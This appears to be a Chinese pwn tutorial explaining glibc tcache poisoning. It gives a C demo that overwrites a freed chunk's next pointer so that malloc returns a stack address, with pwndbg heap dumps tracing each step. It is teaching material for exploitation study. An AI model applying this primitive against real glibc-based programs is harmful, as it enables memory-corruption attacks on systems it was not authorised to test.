> 参考资料：CTF-Wiki
>
> [https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/#tcache-poisoning](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/#tcache-poisoning)
>
> 附件下载：
>
> 链接: [https://pan.baidu.com/s/1qyHpVqCdUzLcqnSZkbnqpQ](https://pan.baidu.com/s/1qyHpVqCdUzLcqnSZkbnqpQ)  密码: 9577
>
> --来自百度网盘超级会员V3的分享
>

# 原理
tcache poisoning的基本原理是覆盖tcache中的next域为目标地址，通过malloc来控制任意地址。

这种攻击方法不需要伪造任何的chunk结构。

# Demo
> 编译命令：gcc -g -fno-stack-protector -z execstack -no-pie -z norelro test.c -o test
>

```c
//gcc -g -fno-stack-protector -z execstack -no-pie -z norelro test.c -o test
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

int main()
{
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    size_t stack_var;
    printf("定义了一个变量 stack_var，我们想让程序 malloc 到这里 %p.\n", (char *)&stack_var);

    printf("接下来申请两个 chunk\n");
    intptr_t *a = malloc(128);
    printf("chunk a 在: %p\n", a);
    intptr_t *b = malloc(128);
    printf("chunk b 在: %p\n", b);

    printf("free 掉这两个 chunk\n");
    free(a);
    free(b);

    printf("现在 tcache 那个链表是这样的 [ %p -> %p ].\n", b, a);
    printf("我们把 %p 的前 %lu 字节（也就是 fd/next 指针）改成 stack_var 的地址：%p", b, sizeof(intptr_t), &stack_var);
    b[0] = (intptr_t)&stack_var;
    printf("现在 tcache 链表是这样的 [ %p -> %p ].\n", b, &stack_var);

    printf("然后一次 malloc : %p\n", malloc(128));
    printf("现在 tcache 链表是这样的 [ %p ].\n", &stack_var);

    intptr_t *c = malloc(128);
    printf("第二次 malloc: %p\n", c);
    printf("Finish!\n");

    return 0;
}
```

编译之后在代码第23行下断点，然后运行程序，此时程序已经释放了申请的两个chunk，看一下堆内存：

```python
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x601000
Size: 0x251

Free chunk (tcache) | PREV_INUSE
Addr: 0x601250
Size: 0x91
fd: 0x00

Free chunk (tcache) | PREV_INUSE
Addr: 0x6012e0
Size: 0x91
fd: 0x601260

Top chunk | PREV_INUSE
Addr: 0x601370
Size: 0x20c91

pwndbg>
```

```powershell
pwndbg> x/120gx 0x601000
0x601000:	0x0000000000000000	0x0000000000000251 #tcache_perthread_struct
0x601010:	0x0200000000000000	0x0000000000000000
    	    #heap在tcachebin中的数目
0x601020:	0x0000000000000000	0x0000000000000000
0x601030:	0x0000000000000000	0x0000000000000000
0x601040:	0x0000000000000000	0x0000000000000000
0x601050:	0x0000000000000000	0x0000000000000000
0x601060:	0x0000000000000000	0x0000000000000000
0x601070:	0x0000000000000000	0x0000000000000000
0x601080:	0x0000000000000000	0x00000000006012f0
															#指向chunk2_data
......（省略内容均为空）
0x601250:	0x0000000000000000	0x0000000000000091 #chunk1
0x601260:	0x0000000000000000	0x0000000000000000
......（省略内容均为空）
0x6012e0:	0x0000000000000000	0x0000000000000091 #chunk2
0x6012f0:	0x0000000000601260	0x0000000000000000
					#指向chunk1_data
......（省略内容均为空）
0x601370:	0x0000000000000000	0x0000000000020c91 #top_chunk
......（省略内容均为空）
0x6013b0:	0x0000000000000000	0x0000000000000000
pwndbg>
```

> **<font style="color:#F5222D;">tcachebin的链表指针是指向下一个chunk的fd字段，</font>****<font style="color:#F5222D;">fastbin</font>****<font style="color:#F5222D;">的链表指针是指向下一个chunk的pre_size字段</font>**
>

此时的bin状况：

```powershell
pwndbg> bin
tcachebins
0x90 [  2]: 0x6012f0 —▸ 0x601260 ◂— 0x0
				#chunk2_data    #chunk1_data
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
pwndbg> 
```

接下来就到了Tcache Poisoning攻击方式的核心，修改tcache的next指针：

对代码第26行下断点，然后运行程序：

```powershell
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x601000
Size: 0x251

Allocated chunk | PREV_INUSE
Addr: 0x601250
Size: 0x91

Free chunk (tcache) | PREV_INUSE
Addr: 0x6012e0
Size: 0x91
fd: 0x7fffffffdff0

Top chunk | PREV_INUSE
Addr: 0x601370
Size: 0x20c91

pwndbg> x/120gx 0x601000
0x601000:	0x0000000000000000	0x0000000000000251 #tcache_perthread_struct
0x601010:	0x0200000000000000	0x0000000000000000
0x601020:	0x0000000000000000	0x0000000000000000
0x601030:	0x0000000000000000	0x0000000000000000
0x601040:	0x0000000000000000	0x0000000000000000
0x601050:	0x0000000000000000	0x0000000000000000
0x601060:	0x0000000000000000	0x0000000000000000
0x601070:	0x0000000000000000	0x0000000000000000
0x601080:	0x0000000000000000	0x00000000006012f0
															#指向chunk2_data
......(省略内容均为空)
0x601250:	0x0000000000000000	0x0000000000000091 #chunk1
......(省略内容均为空)
0x6012e0:	0x0000000000000000	0x0000000000000091 #chunk2
0x6012f0:	0x00007fffffffdff0	0x0000000000000000
					#指向要控制的地址
......(省略内容均为空)
0x601370:	0x0000000000000000	0x0000000000020c91 #top_chunk
......(省略内容均为空)
0x6013b0:	0x0000000000000000	0x0000000000000000
pwndbg> bin
tcachebins
0x90 [  2]: 0x6012f0 —▸ 0x7fffffffdff0 —▸ 0x4007f0 (__libc_csu_init) ◂— ...
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
pwndbg> 
```

最后进行两次malloc之后就会控制想要控制的地址：

```powershell
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x601000
Size: 0x251

Allocated chunk | PREV_INUSE
Addr: 0x601250
Size: 0x91

Allocated chunk | PREV_INUSE
Addr: 0x6012e0
Size: 0x91

Top chunk | PREV_INUSE
Addr: 0x601370
Size: 0x20c91

pwndbg> bin
tcachebins
0x90 [  0]: 0x4007f0 (__libc_csu_init) ◂— ...
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
pwndbg> 
```

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1606725789302-b49aef2c-c41c-4f8e-9374-c7d120206dcb.png)

> 注：此处调试会出现之前“PWN入门（3-14-1）-劫持__malloc_hook和__free_hook”中的疑难1，详细请转到那篇文章。
>



